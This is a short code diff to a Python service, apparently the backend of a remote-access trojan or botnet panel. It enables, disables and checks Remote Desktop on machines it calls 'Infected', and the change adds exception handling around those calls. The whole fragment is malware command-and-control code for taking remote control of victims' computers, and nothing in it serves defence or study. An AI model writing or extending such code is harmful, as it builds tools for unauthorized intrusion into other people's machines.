@@ -6,14 +6,22 @@ class RdpService:
         self.rdpModule = rdpModule
 
     async def activate(self, id: str):
-        
-        response = await self.rdpModule.activate(id)
+        try:
+            response = await self.rdpModule.activate(id)
+        except Exception as e:
+            raise HTTPException(status_code=400, detail=str(e))
         if response["message"].startswith("Infected does not have Remote Desktop feature installed."):
             raise HTTPException(status_code=500, detail="Infected does not have Remote Desktop feature installed. He probably runs a Home edition of Windows.")
         return response
     
     async def deactivate(self, id: str):
-        return await self.rdpModule.deactivate(id)
+        try:
+            return await self.rdpModule.deactivate(id)
+        except Exception as e:
+            raise HTTPException(status_code=400, detail=str(e))
     
     async def status(self, id: str):
-        return await self.rdpModule.status(id)
+        try:
+            return await self.rdpModule.status(id)
+        except Exception as e:
+            raise HTTPException(status_code=400, detail=str(e))
